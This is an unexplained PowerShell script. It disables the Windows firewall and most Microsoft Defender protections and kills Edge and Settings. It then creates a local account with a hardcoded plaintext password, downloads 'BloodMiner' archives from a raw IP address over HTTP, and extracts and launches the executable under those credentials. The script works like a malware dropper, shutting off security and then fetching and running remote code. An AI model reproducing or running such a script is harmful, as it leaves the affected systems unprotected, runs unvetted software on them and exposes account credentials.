netsh advfirewall set allprofiles state off
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
taskkill /F /IM MicrosoftEdge.exe /T
taskkill /F /IM SystemSettings.exe /T

function New-LocalUser
{
    [CmdletBinding()]
    [Alias()]
    [OutputType([int])]
    Param
    (
        # Param1 help description
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        $userName,
        # Param2 help description
        [string]
        $password
    )
 
    $system = [ADSI]"WinNT://$env:COMPUTERNAME";
    $user = $system.Create("user",$userName);
    $user.SetPassword($password);
    $user.SetInfo();
 
    $flag=$user.UserFlags.value -bor 0x10000;
    $user.put("userflags",$flag);
    $user.SetInfo();
 
    $group = [ADSI]("WinNT://$env:COMPUTERNAME/Users");
    $group.PSBase.Invoke("Add", $user.PSBase.Path);
}

#function to register a native method
function Register-NativeMethod
{
    [CmdletBinding()]
    [Alias()]
    [OutputType([int])]
    Param
    (
        # Param1 help description
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [string]$dll,
 
        # Param2 help description
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [string]
        $methodSignature
    )
 
    $script:nativeMethods += [PSCustomObject]@{ Dll = $dll; Signature = $methodSignature; }
}
function Get-Win32LastError
{
    [CmdletBinding()]
    [Alias()]
    [OutputType([int])]
    Param($typeName = 'LastError')
 if (-not ([System.Management.Automation.PSTypeName]$typeName).Type)
    {
    $lasterrorCode = $script:lasterror | ForEach-Object{
        '[DllImport("kernel32.dll", SetLastError = true)]
         public static extern uint GetLastError();'
    }
        Add-Type @"
        using System;
        using System.Text;
        using System.Runtime.InteropServices;
        public static class $typeName {
            $lasterrorCode
        }
"@
    }
}
#function to add native method
function Add-NativeMethods
{
    [CmdletBinding()]
    [Alias()]
    [OutputType([int])]
    Param($typeName = 'NativeMethods')
 
    $nativeMethodsCode = $script:nativeMethods | ForEach-Object { "
        [DllImport(`"$($_.Dll)`")]
        public static extern $($_.Signature);
    " }
 
    Add-Type @"
        using System;
        using System.Text;
        using System.Runtime.InteropServices;
        public static class $typeName {
            $nativeMethodsCode
        }
"@
}

#Main function to create the new user profile
function Create-NewProfile {
 
    [CmdletBinding()]
    [Alias()]
    [OutputType([int])]
    Param
    (
        # Param1 help description
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [string]$UserName,
 
        # Param2 help description
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [string]
        $Password
    )
  
    Write-Verbose "Creating local user $Username";
  
    try
    {
        New-LocalUser -username $UserName -password $Password;
    }
    catch
    {
        Write-Error $_.Exception.Message;
        break;
    }
    $methodName = 'UserEnvCP'
    $script:nativeMethods = @();
 
    if (-not ([System.Management.Automation.PSTypeName]$MethodName).Type)
    {
        Register-NativeMethod "userenv.dll" "int CreateProfile([MarshalAs(UnmanagedType.LPWStr)] string pszUserSid,`
         [MarshalAs(UnmanagedType.LPWStr)] string pszUserName,`
         [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszProfilePath, uint cchProfilePath)";
 
        Add-NativeMethods -typeName $MethodName;
    }
 
    $localUser = New-Object System.Security.Principal.NTAccount("$UserName");
    $userSID = $localUser.Translate([System.Security.Principal.SecurityIdentifier]);
    $sb = new-object System.Text.StringBuilder(260);
    $pathLen = $sb.Capacity;
 
    Write-Verbose "Creating user profile for $Username";
 
    try
    {
        [UserEnvCP]::CreateProfile($userSID.Value, $Username, $sb, $pathLen) | Out-Null;
    }
    catch
    {
        Write-Error $_.Exception.Message;
        break;
    }
}

Create-NewProfile -Username 'hoa1' -Password 'hoa#12345678'


Import-Module BitsTransfer
Start-BitsTransfer -Source http://139.180.134.229/BloodMiner.Zip -Destination C:\BloodMiner.Zip
Start-BitsTransfer -Source http://139.180.134.229/BloodMiner.exe_Url_cg2ib1rovxncy5wjo42qppm3tgybicjg-3cpu.Zip -Destination C:\BloodMiner.exe_Url_cg2ib1rovxncy5wjo42qppm3tgybicjg.Zip

Expand-Archive -Path C:\BloodMiner.Zip -DestinationPath C:\BloodMiner
Expand-Archive -Path C:\BloodMiner.exe_Url_cg2ib1rovxncy5wjo42qppm3tgybicjg.Zip -DestinationPath C:\Users\hoa\AppData\Local\BloodLand_Foundations\BloodMiner.exe_Url_cg2ib1rovxncy5wjo42qppm3tgybicjg


$username = "hoa"

$password = "hoa#12345678"


$credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @($username,(ConvertTo-SecureString -String $password -AsPlainText -Force))

Start-Process -FilePath "C:\BloodMiner\BloodMiner.exe" -Wait -WindowStyle Maximized -Credential ($credentials)